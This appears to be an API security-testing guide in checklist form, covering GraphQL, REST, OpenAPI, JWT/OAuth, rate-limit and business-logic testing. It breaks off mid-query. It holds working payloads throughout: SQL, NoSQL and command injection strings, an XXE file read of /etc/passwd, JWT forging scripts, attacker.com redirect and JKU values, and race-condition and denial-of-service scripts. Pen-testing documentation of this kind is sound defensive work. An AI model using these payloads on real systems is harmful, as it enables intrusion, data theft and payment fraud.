# API Security Testing Overview

## API Discovery Phase

### 1. Identify API Type
```
REST API indicators:
- /api/v1/, /api/v2/ paths
- JSON/XML responses
- Standard HTTP methods (GET, POST, PUT, DELETE, PATCH)
- Resource-based URLs (/users/123, /orders/456)

GraphQL indicators:
- /graphql endpoint
- Single endpoint for all operations
- Query/mutation structure in POST body
- Introspection responses

gRPC indicators:
- application/grpc content-type
- HTTP/2 protocol
- .proto file references
```

### 2. Documentation Discovery
```bash
# Common documentation endpoints
/swagger.json
/swagger.yaml
/openapi.json
/openapi.yaml
/api-docs
/swagger-ui/
/redoc
/graphql (with introspection)
/graphiql
/.well-known/openapi.json

# Discovery commands
gobuster dir -u https://target.com -w api-wordlist.txt
ffuf -u https://target.com/FUZZ -w api-endpoints.txt
```

### 3. API Enumeration Priority
1. **Authentication endpoints** - Login, register, password reset, OAuth
2. **User data endpoints** - Profile, settings, personal info
3. **Financial endpoints** - Payments, transactions, balances
4. **Admin endpoints** - User management, configuration
5. **File operations** - Upload, download, storage
6. **Search/filter** - Potential injection points

## Common API Vulnerabilities (OWASP API Top 10)

| Rank | Vulnerability | Impact |
|------|--------------|--------|
| API1 | Broken Object Level Authorization (BOLA/IDOR) | Access other users' data |
| API2 | Broken Authentication | Account takeover |
| API3 | Broken Object Property Level Authorization | Mass assignment |
| API4 | Unrestricted Resource Consumption | DoS, cost attacks |
| API5 | Broken Function Level Authorization | Privilege escalation |
| API6 | Server Side Request Forgery (SSRF) | Internal access |
| API7 | Security Misconfiguration | Various exploits |
| API8 | Lack of Protection from Automated Threats | Abuse, scraping |
| API9 | Improper Inventory Management | Shadow APIs |
| API10 | Unsafe Consumption of APIs | Supply chain |

## Testing Workflow
1. **Discover** - Find all API endpoints
2. **Document** - Map request/response formats
3. **Authenticate** - Test auth mechanisms
4. **Authorize** - Test access controls (BOLA, BFLA)
5. **Inject** - Test for injection vulnerabilities
6. **Abuse** - Test business logic flaws
7. **Report** - Document with PoC

---

# GraphQL Security Testing

## Step 1: Introspection Query

### Full Schema Introspection
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

### Quick Introspection
```graphql
{__schema{types{name,fields{name}}}}
```

### If Introspection Disabled - Field Suggestions
```graphql
# Try invalid field to trigger suggestions
query { user { __invalid__ } }

# Response may include: "Did you mean: id, name, email, password?"
```

## Step 2: Enumerate Types and Fields

### Find Sensitive Types
Look for types containing:
- User, Admin, Account
- Password, Token, Secret, Key
- Payment, Transaction, Credit
- Internal, Debug, Admin

### Extract User Data Example
```graphql
query {
  users {
    id
    email
    password
    role
    apiKey
    secretToken
  }
}
```

## Step 3: Authorization Testing (BOLA/IDOR)

### Direct Object Access
```graphql
# Test with different IDs
query {
  user(id: "1") { email, role }
  user(id: "2") { email, role }
  user(id: "admin") { email, role }
}
```

### Batch Query for Enumeration
```graphql
query {
  u1: user(id: "1") { email }
  u2: user(id: "2") { email }
  u3: user(id: "3") { email }
  # ... enumerate many IDs
}
```

## Step 4: Mutation Attacks

### Mass Assignment
```graphql
mutation {
  updateUser(input: {
    id: "victim_id"
    role: "admin"
    isVerified: true
    balance: 999999
  }) {
    id
    role
  }
}
```

### Delete Without Authorization
```graphql
mutation {
  deleteUser(id: "victim_id") {
    success
  }
}
```

## Step 5: Injection Attacks

### SQL Injection via GraphQL
```graphql
query {
  user(id: "1' OR '1'='1") { email }
  users(filter: "' UNION SELECT password FROM users--") { email }
  search(query: "'; DROP TABLE users;--") { results }
}
```

### NoSQL Injection
```graphql
query {
  user(filter: {email: {$ne: ""}}) { email, password }
  login(username: {$gt: ""}, password: {$gt: ""}) { token }
}
```

## Step 6: DoS via Query Complexity

### Deeply Nested Query
```graphql
query {
  users {
    friends {
      friends {
        friends {
          friends {
            friends {
              # Exponential complexity
              id
            }
          }
        }
      }
    }
  }
}
```

### Alias-Based DoS
```graphql
query {
  a1: expensiveOperation { data }
  a2: expensiveOperation { data }
  a3: expensiveOperation { data }
  # ... 1000 aliases
}
```

### Directive Overloading
```graphql
query {
  users @include(if: true) @skip(if: false) @deprecated {
    id @include(if: true) @skip(if: false)
  }
}
```

## Step 7: Information Disclosure

### Error-Based Extraction
```graphql
# Trigger errors to leak info
query { user(id: 999999999999999999) { email } }
query { __type(name: "InternalAdminType") { fields { name } } }
```

### Debug Mode Detection
```graphql
# Check for verbose errors
query { invalid_query_to_trigger_error }
```

## GraphQL Tools

```bash
# GraphQL Voyager - Visual schema
# InQL - Burp extension
# graphql-cop - Security scanner

# Using curl
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'
```

## GraphQL Checklist
- [ ] Introspection enabled?
- [ ] Field suggestions leak schema?
- [ ] BOLA/IDOR on queries/mutations?
- [ ] Mass assignment via mutations?
- [ ] SQL/NoSQL injection in arguments?
- [ ] Query complexity limits?
- [ ] Rate limiting on queries?
- [ ] Sensitive fields exposed?
- [ ] Debug mode enabled?
- [ ] Batching abuse possible?

---

# REST API Security Testing

## Endpoint Discovery

### Common Patterns
```
/api/v1/users
/api/v1/users/{id}
/api/v1/users/{id}/profile
/api/v1/users/{id}/settings
/api/v1/admin/users
/api/internal/debug
/api/v2/users (version differences)
/api/users.json
/api/users.xml
```

### HTTP Method Testing
```bash
# Test all methods on each endpoint
for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
  curl -X $method https://target.com/api/users -v
done
```

### Parameter Discovery
```bash
# Common parameters to test
?id=1
?user_id=1
?userId=1
?uid=1
?account=1
?debug=true
?test=true
?admin=true
?_format=json
?_method=PUT
?callback=test
```

## BOLA/IDOR Testing

### Numeric ID Enumeration
```bash
# Sequential testing
for i in {1..100}; do
  curl "https://target.com/api/users/$i" -H "Authorization: Bearer $TOKEN"
done

# Common ID patterns
/users/1
/users/100
/users/1000
/users/00001
/users/user_1
```

### UUID/GUID Testing
```
# Even UUIDs can be predictable
/users/00000000-0000-0000-0000-000000000001
/users/xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx

# Check if leaked in responses
# Search for UUIDs in: error messages, emails, exports
```

### Horizontal Privilege Escalation
```bash
# As User A, try to access User B's data
curl "https://target.com/api/users/B_ID/profile" \
  -H "Authorization: Bearer USER_A_TOKEN"

# Try in different endpoints
/api/users/{other_id}/orders
/api/users/{other_id}/payments
/api/users/{other_id}/messages
```

### Vertical Privilege Escalation
```bash
# As regular user, try admin endpoints
curl "https://target.com/api/admin/users" \
  -H "Authorization: Bearer REGULAR_USER_TOKEN"

# Try adding admin parameters
curl "https://target.com/api/users" \
  -H "Authorization: Bearer REGULAR_USER_TOKEN" \
  -d '{"role": "admin"}'
```

## Mass Assignment Testing

### Identify Writable Fields
```bash
# Send extra fields in update requests
curl -X PUT "https://target.com/api/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test",
    "role": "admin",
    "isAdmin": true,
    "verified": true,
    "balance": 999999,
    "credits": 999999,
    "permissions": ["all"]
  }'
```

### Common Dangerous Fields
```json
{
  "role": "admin",
  "isAdmin": true,
  "is_admin": true,
  "admin": true,
  "verified": true,
  "email_verified": true,
  "active": true,
  "balance": 999999,
  "credits": 999999,
  "subscription": "premium",
  "plan": "enterprise",
  "permissions": ["*"],
  "password": "newpassword",
  "password_hash": "...",
  "api_key": "...",
  "created_at": "2020-01-01",
  "updated_at": "2020-01-01"
}
```

## API Injection Testing

### SQL Injection
```bash
# In query parameters
/api/users?id=1'
/api/users?id=1 OR 1=1
/api/users?sort=name; DROP TABLE users--
/api/search?q=' UNION SELECT password FROM users--

# In JSON body
{"username": "admin'--", "password": "x"}
{"filter": {"$where": "this.password == 'x'"}}
```

### NoSQL Injection
```json
// MongoDB injection
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}}
{"$where": "this.password.length > 0"}

// Query parameter
?username[$ne]=invalid&password[$ne]=invalid
```

### Command Injection
```bash
# In parameters that might execute commands
/api/convert?file=test.pdf;id
/api/ping?host=127.0.0.1;whoami
/api/export?format=pdf|cat /etc/passwd
```

## Content-Type Attacks

### Content-Type Switching
```bash
# Try different content types
curl -X POST "https://target.com/api/users" \
  -H "Content-Type: application/xml" \
  -d '<user><name>test</name><role>admin</role></user>'

# XXE via XML
curl -X POST "https://target.com/api/users" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>'
```

### Parameter Pollution
```bash
# HTTP Parameter Pollution
/api/users?id=1&id=2
/api/transfer?amount=100&amount=-100

# JSON pollution
{"id": 1, "id": 2}
```

## API Response Analysis

### Verbose Error Messages
```
Check for:
- Stack traces
- SQL queries
- Internal paths
- Server versions
- Framework info
```

### Data Leakage in Responses
```json
// Look for extra fields in responses
{
  "user": {
    "id": 1,
    "name": "John",
    "email": "john@example.com",
    "password_hash": "...",  // LEAK!
    "api_key": "...",        // LEAK!
    "internal_id": "..."     // LEAK!
  }
}
```

## REST API Fuzzing Commands

```bash
# Fuzz endpoints
ffuf -u https://target.com/api/FUZZ -w api-wordlist.txt

# Fuzz parameters
ffuf -u "https://target.com/api/users?FUZZ=test" -w params.txt

# Fuzz IDs
ffuf -u https://target.com/api/users/FUZZ -w numbers.txt

# Fuzz with different methods
ffuf -u https://target.com/api/FUZZ -w endpoints.txt -X POST
```

## REST API Checklist
- [ ] All endpoints discovered?
- [ ] BOLA/IDOR tested on all resources?
- [ ] Mass assignment tested?
- [ ] All HTTP methods tested?
- [ ] Injection points tested?
- [ ] Content-type attacks tested?
- [ ] Rate limiting present?
- [ ] Response data leakage checked?
- [ ] Error messages analyzed?
- [ ] Versioning differences checked?

---

# OpenAPI/Swagger Specification Exploitation

## Finding OpenAPI Specs

### Common Locations
```
/swagger.json
/swagger.yaml
/swagger/v1/swagger.json
/api-docs
/api-docs.json
/v1/api-docs
/v2/api-docs
/v3/api-docs
/openapi.json
/openapi.yaml
/openapi/v1.json
/api/swagger.json
/docs/api.json
/.well-known/openapi.json
/api/v1/swagger.json
/api/v2/swagger.json
```

### Discovery Commands
```bash
# Brute force common paths
gobuster dir -u https://target.com -w swagger-wordlist.txt -x json,yaml

# Check for UI endpoints
curl -s https://target.com/swagger-ui/ | grep -i "swagger"
curl -s https://target.com/api-docs/ | grep -i "openapi"
```

## Parsing OpenAPI for Attack Surface

### Key Sections to Analyze

```yaml
# 1. Servers - Find all API hosts
servers:
  - url: https://api.target.com
  - url: https://staging-api.target.com  # Staging might be less secure!
  - url: https://internal-api.target.com  # Internal API exposed?

# 2. Paths - All endpoints
paths:
  /users:
    get: ...
    post: ...
  /admin/users:  # Admin endpoint!
    get: ...
  /internal/debug:  # Debug endpoint!
    get: ...

# 3. Security Schemes - Auth mechanisms
securityDefinitions:
  apiKey:
    type: apiKey
    name: X-API-Key
    in: header
  oauth2:
    type: oauth2
    flow: password
    tokenUrl: /oauth/token

# 4. Parameters - Injection points
parameters:
  - name: id
    in: path
    type: integer  # Try: strings, negatives, large numbers
  - name: filter
    in: query
    type: string  # Try: SQL injection, command injection
```

### Automated Parsing Script
```python
#!/usr/bin/env python3
import json
import yaml
import sys

def parse_openapi(spec_file):
    with open(spec_file) as f:
        if spec_file.endswith('.yaml') or spec_file.endswith('.yml'):
            spec = yaml.safe_load(f)
        else:
            spec = json.load(f)

    print("=== SERVERS ===")
    for server in spec.get('servers', []):
        print(f"  {server.get('url')}")

    print("\n=== ENDPOINTS ===")
    for path, methods in spec.get('paths', {}).items():
        for method in methods:
            if method in ['get', 'post', 'put', 'delete', 'patch']:
                security = methods[method].get('security', 'None')
                print(f"  {method.upper()} {path} [Auth: {security}]")

    print("\n=== SECURITY SCHEMES ===")
    for name, scheme in spec.get('securityDefinitions', {}).items():
        print(f"  {name}: {scheme.get('type')}")

    print("\n=== INTERESTING ENDPOINTS ===")
    interesting = ['admin', 'internal', 'debug', 'test', 'private', 'secret']
    for path in spec.get('paths', {}).keys():
        if any(word in path.lower() for word in interesting):
            print(f"  INTERESTING: {path}")

if __name__ == "__main__":
    parse_openapi(sys.argv[1])
```

## Exploiting OpenAPI Information

### 1. Identify Unauthenticated Endpoints
```yaml
# Look for endpoints without security requirement
paths:
  /public/data:
    get:
      # No 'security' field = potentially unauthenticated
      responses:
        200:
          description: Success
```

### 2. Find Deprecated/Hidden Endpoints
```yaml
# Deprecated endpoints might have weaker security
paths:
  /api/v1/users:  # Old version
    deprecated: true
  /api/v2/users:  # New version
```

### 3. Identify Mass Assignment Risks
```yaml
# Check request body schemas for dangerous fields
components:
  schemas:
    UserUpdate:
      properties:
        name:
          type: string
        role:  # Can users set their own role?
          type: string
        isAdmin:  # Mass assignment risk!
          type: boolean
```

### 4. Find SSRF-Prone Parameters
```yaml
# Parameters accepting URLs
parameters:
  - name: callback_url
    in: query
    type: string
    format: uri  # SSRF candidate!
  - name: webhook
    in: body
    schema:
      properties:
        url:
          type: string  # SSRF candidate!
```

### 5. Identify File Upload Endpoints
```yaml
# File upload = potential RCE
paths:
  /upload:
    post:
      requestBody:
        content:
          multipart/form-data:
            schema:
              properties:
                file:
                  type: string
                  format: binary
```

## Generate Attack Payloads from Spec

### Using openapi-generator
```bash
# Generate client to understand API structure
openapi-generator generate -i swagger.json -g python -o ./client

# Generate curl commands for each endpoint
openapi-generator generate -i swagger.json -g bash -o ./scripts
```

### Manual Curl Generation
```bash
# For each endpoint in spec, generate test curl
curl -X GET "https://api.target.com/users/1" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json"

# Test BOLA
curl -X GET "https://api.target.com/users/2" \
  -H "Authorization: Bearer USER_1_TOKEN"
```

## OpenAPI Security Checklist

- [ ] All server URLs tested?
- [ ] Deprecated endpoints still accessible?
- [ ] Internal/admin endpoints exposed?
- [ ] Unauthenticated endpoints identified?
- [ ] Mass assignment fields found?
- [ ] SSRF-prone parameters identified?
- [ ] File upload endpoints secured?
- [ ] Rate limits documented?
- [ ] Sensitive data in examples?
- [ ] Debug/test endpoints exposed?

---

# API Authentication Security Testing

## JWT (JSON Web Token) Attacks

### 1. Decode and Analyze
```bash
# JWT structure: header.payload.signature
# Decode (base64url)
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d

# Using jwt_tool
jwt_tool <token>

# Online: jwt.io
```

### 2. Algorithm Confusion Attack
```python
# Change RS256 to HS256 and sign with public key
import jwt
import json

token = "eyJ..."
header = jwt.get_unverified_header(token)
payload = jwt.decode(token, options={"verify_signature": False})

# Forge with public key as HMAC secret
public_key = open("public.pem").read()
forged = jwt.encode(payload, public_key, algorithm="HS256")
```

### 3. None Algorithm Attack
```python
# Set algorithm to "none" and remove signature
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin"}

h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')

forged = f"{h.decode()}.{p.decode()}."
```

### 4. Weak Secret Brute Force
```bash
# Using hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Using jwt_tool
jwt_tool <token> -C -d wordlist.txt

# Common weak secrets
secret
password
123456
key
jwt_secret
changeme
```

### 5. Claim Tampering
```json
// Original claims
{"sub": "user123", "role": "user", "exp": 1234567890}

// Tampered claims (if signature not verified properly)
{"sub": "admin", "role": "admin", "exp": 9999999999}
```

### 6. JKU/X5U Header Injection
```json
// Inject URL to attacker-controlled key server
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/jwks.json"
}
```

### 7. Kid (Key ID) Injection
```json
// SQL injection via kid
{"alg": "HS256", "kid": "' UNION SELECT 'secret'--"}

// Path traversal via kid
{"alg": "HS256", "kid": "../../../dev/null"}
```

## OAuth 2.0 Attacks

### 1. Authorization Code Interception
```
# Check for:
- HTTP redirect_uri (should be HTTPS)
- Open redirect in redirect_uri
- Wildcard or partial redirect_uri matching

# Test:
redirect_uri=https://attacker.com
redirect_uri=https://target.com.attacker.com
redirect_uri=https://target.com@attacker.com
redirect_uri=https://target.com%2F@attacker.com
```

### 2. CSRF in OAuth Flow
```
# Check if 'state' parameter is:
- Present
- Validated
- Unpredictable

# Attack without state
<img src="https://target.com/oauth/callback?code=ATTACKER_CODE">
```

### 3. Token Leakage
```
# Check for tokens in:
- URL parameters (access_token in fragment)
- Referrer headers
- Browser history
- Server logs

# response_type vulnerabilities
response_type=token (implicit flow - token in URL)
response_type=code token (hybrid - both exposed)
```

### 4. Client Secret Exposure
```bash
# Search for secrets in:
- JavaScript files
- Mobile app binaries (apktool, jadx)
- Git history
- Error messages

# Test if client_secret is actually required
curl -X POST "https://target.com/oauth/token" \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=CLIENT_ID"
  # No client_secret - does it work?
```

### 5. PKCE Bypass
```
# If PKCE is optional, test without it
curl -X POST "https://target.com/oauth/token" \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=CLIENT_ID"
  # No code_verifier - does it work?
```

## API Key Security

### 1. Key Exposure
```bash
# Search for API keys in:
grep -r "api_key" .
grep -r "apikey" .
grep -r "x-api-key" .

# In JavaScript
curl https://target.com/app.js | grep -i "api"
```

### 2. Key Validation Bypass
```bash
# Test if keys are properly validated
curl -H "X-API-Key: invalid" https://target.com/api/data
curl -H "X-API-Key: " https://target.com/api/data
curl https://target.com/api/data  # No key at all
```

### 3. Key Scope Testing
```bash
# Test if read-only key can write
curl -X POST -H "X-API-Key: READ_ONLY_KEY" \
  https://target.com/api/data -d '{"test": "data"}'
```

## Session Token Attacks

### 1. Token Predictability
```python
# Collect multiple tokens and analyze
tokens = [
    "abc123def456",
    "abc124def457",  # Sequential?
    "abc125def458"
]

# Check for:
# - Sequential patterns
# - Timestamp-based
# - Weak entropy
```

### 2. Token Fixation
```
1. Attacker gets a valid session token
2. Tricks victim into using that token
3. When victim authenticates, attacker's token is now authenticated
```

### 3. Token in URL
```
# Dangerous: tokens in URL can leak via Referrer
https://target.com/api/data?token=secret123

# Check if token appears in:
- Access logs
- Referrer headers
- Browser history
- Analytics
```

## Authentication Bypass Checklist

- [ ] JWT algorithm confusion tested?
- [ ] JWT none algorithm tested?
- [ ] JWT weak secret brute forced?
- [ ] JWT claims tampered?
- [ ] OAuth redirect_uri manipulated?
- [ ] OAuth state parameter validated?
- [ ] OAuth implicit flow used (insecure)?
- [ ] API keys properly scoped?
- [ ] Session tokens predictable?
- [ ] MFA bypass possible?
- [ ] Password reset flow secure?
- [ ] Account lockout present?

---

# API Rate Limiting and Abuse Testing

## Rate Limit Detection

### Identify Rate Limits
```bash
# Rapid fire requests to detect limits
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" https://target.com/api/endpoint
done

# Look for:
# - 429 Too Many Requests
# - 503 Service Unavailable
# - Rate limit headers:
#   X-RateLimit-Limit
#   X-RateLimit-Remaining
#   X-RateLimit-Reset
#   Retry-After
```

### Rate Limit Scope
```
Test if limits are per:
- IP address
- User account
- API key
- Endpoint
- HTTP method
```

## Rate Limit Bypass Techniques

### 1. Header Manipulation
```bash
# Spoof origin IP
curl -H "X-Forwarded-For: 1.2.3.4" https://target.com/api/data
curl -H "X-Real-IP: 1.2.3.4" https://target.com/api/data
curl -H "X-Originating-IP: 1.2.3.4" https://target.com/api/data
curl -H "X-Client-IP: 1.2.3.4" https://target.com/api/data
curl -H "True-Client-IP: 1.2.3.4" https://target.com/api/data
curl -H "X-Forwarded-Host: attacker.com" https://target.com/api/data
```

### 2. Endpoint Variation
```bash
# Try different paths to same resource
/api/users
/api/users/
/api/users?
/api/./users
/api/users/../users
/API/USERS
/Api/Users
```

### 3. HTTP Method Variation
```bash
# Some limits only apply to specific methods
curl -X GET https://target.com/api/data
curl -X HEAD https://target.com/api/data
curl -X OPTIONS https://target.com/api/data
```

### 4. Parameter Pollution
```bash
# Add random parameters to appear as different requests
curl "https://target.com/api/data?random=1"
curl "https://target.com/api/data?random=2"
curl "https://target.com/api/data?_=timestamp"
```

### 5. Encoding Variations
```bash
# URL encoding variations
/api/users
/api/users%20
/api%2Fusers
/api/user%73
```

## Resource Exhaustion Attacks

### 1. Large Payload
```bash
# Send large request body
python -c "print('A'*10000000)" | curl -X POST -d @- https://target.com/api/data
```

### 2. Deep Nesting
```json
// Deeply nested JSON
{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{}}}}}}}}}}}
```

### 3. Regex DoS (ReDoS)
```bash
# If input is matched against regex
curl -d "input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" https://target.com/api/validate
```

### 4. Expensive Operations
```bash
# Trigger expensive backend operations
curl "https://target.com/api/search?q=*" # Wildcard search
curl "https://target.com/api/export?format=pdf&all=true" # Large export
curl "https://target.com/api/report?start=2000-01-01&end=2024-12-31" # Long date range
```

### 5. Concurrent Connections
```bash
# Open many concurrent connections
for i in {1..1000}; do
  curl -s https://target.com/api/slow-endpoint &
done
wait
```

## Cost-Based Attacks

### Cloud Resource Abuse
```bash
# If API triggers cloud resources (AWS, GCP, Azure)
# Each request might cost money

# Example: Image processing API
curl -X POST https://target.com/api/process-image -F "image=@large.jpg"
# If no rate limit, attacker can cause significant cloud bills
```

### Third-Party API Exhaustion
```bash
# If API proxies to paid third-party services
curl https://target.com/api/geocode?address=test
# Each request might cost target money
```

## Rate Limiting Checklist

- [ ] Rate limits exist?
- [ ] Limits per IP, user, or key?
- [ ] Header spoofing bypasses limits?
- [ ] Path variations bypass limits?
- [ ] Method variations bypass limits?
- [ ] Large payloads handled?
- [ ] Deep nesting handled?
- [ ] Expensive operations limited?
- [ ] Concurrent connections limited?
- [ ] Cost implications tested?

---

# API Business Logic Testing

## Workflow Bypass

### Skip Verification Steps
```bash
# Normal flow: Register → Verify Email → Access
# Attack: Register → Access (skip verification)

# 1. Register account
curl -X POST https://target.com/api/register \
  -d '{"email": "test@test.com", "password": "test123"}'

# 2. Skip verification, try to access directly
curl https://target.com/api/protected-resource \
  -H "Authorization: Bearer UNVERIFIED_TOKEN"
```

### Order Flow Manipulation
```bash
# Normal flow: Add to cart → Checkout → Payment → Confirmation
# Attack: Checkout with empty cart, negative prices, etc.

# Skip payment step
curl -X POST https://target.com/api/orders/confirm \
  -d '{"order_id": "123"}' \
  -H "Authorization: Bearer $TOKEN"
  # Without completing payment step
```

### State Machine Bypass
```
# Test if states can be skipped or reversed
PENDING → PROCESSING → COMPLETED → SHIPPED

# Try:
PENDING → COMPLETED (skip processing)
COMPLETED → PENDING (reverse state)
SHIPPED → PROCESSING (invalid transition)
```

## Price and Quantity Manipulation

### Negative Values
```bash
# Negative quantity
curl -X POST https://target.com/api/cart/add \
  -d '{"product_id": "123", "quantity": -1}' \
  -H "Authorization: Bearer $TOKEN"

# Negative price (if modifiable)
curl -X POST https://target.com/api/cart/update \
  -d '{"item_id": "456", "price": -100}' \
  -H "Authorization: Bearer $TOKEN"
```

### Zero Values
```bash
# Zero quantity but still checkout
curl -X POST https://target.com/api/checkout \
  -d '{"items": [{"id": "123", "quantity": 0, "price": 100}]}' \
  -H "Authorization: Bearer $TOKEN"
```

### Large Values
```bash
# Integer overflow
curl -X POST https://target.com/api/cart/add \
  -d '{"product_id": "123", "quantity": 9999999999999}' \
  -H "Authorization: Bearer $TOKEN"

# Float precision issues
curl -X POST https://target.com/api/payment \
  -d '{"amount": 0.00000001}' \
  -H "Authorization: Bearer $TOKEN"
```

### Discount Abuse
```bash
# Apply discount multiple times
curl -X POST https://target.com/api/cart/discount \
  -d '{"code": "SAVE50"}'
curl -X POST https://target.com/api/cart/discount \
  -d '{"code": "SAVE50"}'  # Apply again

# Stack different discounts
curl -X POST https://target.com/api/cart/discount \
  -d '{"codes": ["SAVE50", "NEWUSER", "FREESHIP"]}'

# Expired/invalid coupon
curl -X POST https://target.com/api/cart/discount \
  -d '{"code": "EXPIRED2020"}'
```

## Race Conditions

### Double Spend
```python
import asyncio
import aiohttp

async def withdraw(session, amount):
    async with session.post(
        "https://target.com/api/wallet/withdraw",
        json={"amount": amount},
        headers={"Authorization": f"Bearer {TOKEN}"}
    ) as response:
        return await response.json()

async def race_withdraw():
    async with aiohttp.ClientSession() as session:
        # Send multiple withdrawals simultaneously
        tasks = [withdraw(session, 100) for _ in range(10)]
        results = await asyncio.gather(*tasks)
        print(results)

asyncio.run(race_withdraw())
```

### Coupon Race
```python
# Apply same coupon in parallel before it's marked as used
async def apply_coupon(session, code):
    async with session.post(
        "https://target.com/api/cart/discount",
        json={"code": code},
        headers={"Authorization": f"Bearer {TOKEN}"}
    ) as response:
        return await response.json()

async def race_coupon():
    async with aiohttp.ClientSession() as session:
        tasks = [apply_coupon(session, "SINGLE_USE_CODE") for _ in range(50)]
        results = await asyncio.gather(*tasks)
        # Count successes
        print(f"Successes: {sum(1 for r in results if r.get('success'))}")

asyncio.run(race_coupon())
```

### Limited Resource Race
```python
# Race to claim limited inventory
async def claim_item(session, item_id):
    async with session.post(
        f"https://target.com/api/items/{item_id}/claim",
        headers={"Authorization": f"Bearer {TOKEN}"}
    ) as response:
        return await response.json()

async def race_claim():
    async with aiohttp.ClientSession() as session:
        # Multiple users trying to claim same item
        tasks = [claim_item(session, "limited-item-1") for _ in range(100)]
        results = await asyncio.gather(*tasks)
        print(f"Claims: {sum(1 for r in results if r.get('success'))}")
        # Should only be 1, but race condition might allow more

asyncio.run(race_claim())
```

## Currency and Payment Manipulation

### Currency Confusion
```bash
# Change currency mid-transaction
curl -X POST https://target.com/api/payment \
  -d '{"amount": 100, "currency": "VND"}' # Vietnamese Dong
  # If converted incorrectly: 100 VND ≈ $0.004
```

### Payment Callback Manipulation
```bash
# Modify payment callback data
curl -X POST https://target.com/api/payment/callback \
  -d '{
    "transaction_id": "TXN123",
    "status": "success",
    "amount": 1,  # Changed from 100
    "signature": "INVALID"
  }'
```

### Refund Abuse
```bash
# Request refund without returning item
curl -X POST https://target.com/api/orders/123/refund \
  -d '{"reason": "defective"}' \
  -H "Authorization: Bearer $TOKEN"

# Refund more than paid
curl -X POST https://target.com/api/orders/123/refund \
  -d '{"amount": 1000}' \  # Order was only $100
  -H "Authorization: Bearer $TOKEN"
```

## Account Enumeration via API

### User Existence
```bash
# Different responses reveal user existence
# 404 = user doesn't exist
# 401 = user exists but wrong password
curl -X POST https://target.com/api/login \
  -d '{"email": "exists@test.com", "password": "wrong"}'
# Response: "Invalid password"

curl -X POST https://target.com/api/login \
  -d '{"email": "notexists@test.com", "password": "wrong"}'
# Response: "User not found"
```

### Timing-Based Enumeration
```python
import time
import requests

def check_user(email):
    start = time.time()
    requests.post("https://target.com/api/login", json={
        "email": email,
        "password": "wrong"
    })
    return time.time() - start

# Existing users might take longer (password hash comparison)
print(f"existing@test.com: {check_user('existing@test.com'):.3f}s")
print(f"notexist@test.com: {check_user('notexist@test.com'):.3f}s")
```

## Business Logic Checklist

- [ ] Workflow steps can be skipped?
- [ ] States can be manipulated?
- [ ] Negative quantities accepted?
- [ ] Zero values handled properly?
- [ ] Integer overflow tested?
- [ ] Discounts stack improperly?
- [ ] Race conditions exploitable?
- [ ] Currency confusion possible?
- [ ] Payment callbacks verified?
- [ ] Refund logic secure?
- [ ] User enumeration possible?

---

# API Data Exposure Testing

## Excessive Data Exposure

### Response Field Analysis
```bash
# Check what fields are returned
curl https://target.com/api/users/me \
  -H "Authorization: Bearer $TOKEN" | jq

# Look for sensitive fields:
# - password, password_hash
# - api_key, secret_key, token
# - ssn, credit_card, cvv
# - internal_id, database_id
# - created_by, modified_by (internal users)
# - ip_address, location
# - debug_info, stack_trace
```

### Different Response Levels
```bash
# Same endpoint, different verbosity
curl https://target.com/api/users/1
curl https://target.com/api/users/1?verbose=true
curl https://target.com/api/users/1?debug=true
curl https://target.com/api/users/1?include=all
curl https://target.com/api/users/1?fields=*
```

### Admin vs User Response
```bash
# Compare responses as different roles
# As regular user
curl https://target.com/api/orders \
  -H "Authorization: Bearer USER_TOKEN"

# As admin (if accessible)
curl https://target.com/api/orders \
  -H "Authorization: Bearer ADMIN_TOKEN"

# Admin might see more fields
```

## Sensitive Data in Errors

### Verbose Error Messages
```bash
# Trigger errors to leak info
curl https://target.com/api/users/invalid_id
# Response: "Error: SELECT * FROM users WHERE id = 'invalid_id'"

curl https://target.com/api/process \
  -H "Content-Type: application/json" \
  -d '{"invalid": "data"}'
# Response: "TypeError at /app/services/process.py:123"
```

### Stack Traces
```
Look for errors containing:
- File paths (/var/www/app/, /home/user/)
- Function names (internal code structure)
- Line numbers (code navigation)
- Database queries (SQL structure)
- Environment variables (config leak)
- Third-party service URLs
```

## GraphQL Specific Exposure

### Field Discovery via Errors
```graphql
# Invalid field triggers suggestions
query { user { invalid_field } }
# Response: "Unknown field 'invalid_field'. Did you mean: password, api_key, ssn?"
```

### Deep Field Traversal
```graphql
query {
  users {
    orders {
      payments {
        creditCard {
